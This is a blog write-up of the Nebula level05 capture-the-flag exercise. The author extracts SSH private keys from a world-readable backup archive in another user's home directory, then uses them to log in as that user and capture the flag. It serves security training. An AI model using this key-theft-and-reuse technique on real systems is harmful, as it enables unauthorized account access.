---
layout: post
title: "Weak permissions"
category: CTF, Nebula
---

>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; **[Nebula 05](http://exploit-exercises.com/nebula/level05) Agenda**: "Check the flag05 home directory. You are looking for weak directory permissions"

<center>
	<img src="/images/2015-03-03-weak_permissions/1db3d554c8379640ce16fcc2964b.jpg">
</center>

<br />

{% highlight sh linenos %}
level05@nebula:~$ cd /home/flag05
level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     100 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh

level05@nebula:/home/flag05$ cd ./.backup/
level05@nebula:/home/flag05/.backup$ ls -la
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz

level05@nebula:/home/flag05/.backup$ file backup-19072011.tgz
backup-19072011.tgz: gzip compressed data, from Unix, last modified: 
Tue Jul 19 02:38:48 2011

level05@nebula:/home/flag05/.backup$ mkdir /tmp/flag05/
level05@nebula:/home/flag05/.backup$ cd /tmp/flag05/

level05@nebula:/tmp/flag05$ tar -xzvf /home/flag05/.backup/backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
{% endhighlight %}

Therefore the "*weak*" directory was the hidden "*/home/flag05/.backup*" folder. To extract archive we used [tar](http://unixhelp.ed.ac.uk/CGI/man-cgi?tar) utility (line #26). And as result we have public ("*id_rsa.pub*") and private ("*id_rsa*") [ssh](http://en.wikipedia.org/wiki/Secure_Shell) [rsa](http://en.wikipedia.org/wiki/RSA_%28cryptosystem%29) keys. In an [asymmetric key encryption scheme](http://en.wikipedia.org/wiki/Public-key_cryptography), anyone can encrypt messages using the public key, but only the holder of the paired private key can decrypt. Security depends on the secrecy of the private key. Now we can use OpenSSH SSH [client](http://unixhelp.ed.ac.uk/CGI/man-cgi?ssh+1) with usage of identity(private key) to login as "*flag05*" user:

{% highlight sh linenos %}
level05@nebula:/tmp/flag05$ ssh -i ./.ssh/id_rsa flag05@localhost

flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
{% endhighlight %}